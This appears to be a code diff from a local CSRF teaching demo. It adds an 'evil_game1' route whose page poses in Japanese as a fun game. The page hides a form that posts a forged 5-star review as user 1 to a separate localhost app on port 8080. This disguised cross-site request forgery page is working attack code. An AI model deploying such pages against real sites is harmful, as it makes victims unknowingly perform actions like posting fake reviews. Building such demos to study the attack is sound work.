@@ -28,4 +28,17 @@ def add_user():
     cur.execute('INSERT INTO users (datetime, email, password) VALUES (?, ?, ?)', (datetime.now(), email, password))
     conn.commit()
     redirect('http://localhost:8080/logout')
+
+@route('/evil_game1')
+def show_game():
+    return '''
+<p>とっても楽しいゲームだよ！</p>
+<form action="http://localhost:8080/reviews" method="post">
+  <input type="hidden" name="product_id" value="1" />
+  <input type="hidden" name="user_id" value="1" />
+  <input type="hidden" name="rate" value="5" />
+  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
+  <input type="submit" value="遊んでみる" />
+</form>'''
+
 run(host='localhost', port=8081, debug=True, reloader=True)
